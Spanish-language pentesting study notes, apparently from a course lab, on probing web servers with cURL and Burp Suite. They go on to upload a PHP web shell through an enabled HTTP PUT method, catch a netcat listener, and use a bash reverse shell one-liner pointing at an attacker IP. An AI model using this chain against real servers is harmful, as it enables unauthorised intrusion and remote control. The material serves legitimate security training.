# cURL y Testing de Aplicaciones Web

---

## 1. Comandos básicos con cURL

```bash
curl -v http://dominio.com
```
- `-v` → modo verbose (muestra detalles de la petición/respuesta).  

```bash
curl -I http://dominio.com
```
- `-I` → solo devuelve **cabeceras de respuesta**.  

```bash
curl -v -I http://dominio.com
```
- Combina verbose + cabeceras.  

```bash
curl -v -X GET http://dominio.com
curl -v -X PUT http://dominio.com
curl -X OPTIONS demo.ine.local -v
(mira opciones del servidor de manera más rápida que burp)
```
- `-X` → permite elegir el método HTTP a usar (GET, POST, PUT, DELETE, OPTIONS…).  

---

## 2. Testing con BurpSuite
1. Intercepta una petición normal (ejemplo: `GET /uploads`).  
2. Cambia el método manualmente en la parte superior:  
   - De: `GET /uploads HTTP/1.1`  
   - A: `OPTIONS /uploads HTTP/1.1`  
3. Esto permite descubrir métodos habilitados en ese endpoint (ej: `PUT, DELETE, PROPFIND`).  

---

## 3. Subir archivos con cURL
Si `PUT` está habilitado en `/uploads/`:
```bash
curl -v -X PUT http://<IP>/uploads/shell.php --upload-file /usr/share/webshells/php/simple-backdoor.php
```

- Esto intenta subir la **webshell PHP** al directorio `/uploads`.  
- Luego accede vía navegador:  
  ```
  http://<IP>/uploads/shell.php
  ```

---

## 4. Reverse Shell con la webshell
1. En tu máquina atacante, escucha con netcat:
```bash
nc -lvp 4444
```

2. Accede a la webshell y ejecuta un comando reverse shell, por ejemplo en PHP:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/<IP_atacante>/4444 0>&1'"); ?>
```

3. Cuando visites la URL de la shell, la conexión se abrirá hacia tu netcat:
```
http://<IP>/uploads/shell.php
```

---

## 5. Flujo completo
1. Descubrir métodos disponibles (Burp o cURL con `-X OPTIONS`).  
2. Ver si `PUT` está permitido en `/uploads`.  
3. Subir archivo PHP malicioso con cURL.  
4. Acceder al archivo desde el navegador.  
5. Ejecutar payload de reverse shell.  
6. Recibir conexión en netcat (`nc -lvp 4444`).  

---

## Resumen rápido de comandos
```bash
curl -v http://dominio.com
curl -I http://dominio.com
curl -v -X OPTIONS http://dominio.com/uploads
curl -v -X PUT http://IP/uploads/shell.php --upload-file shell.php
nc -lvp 4444
```
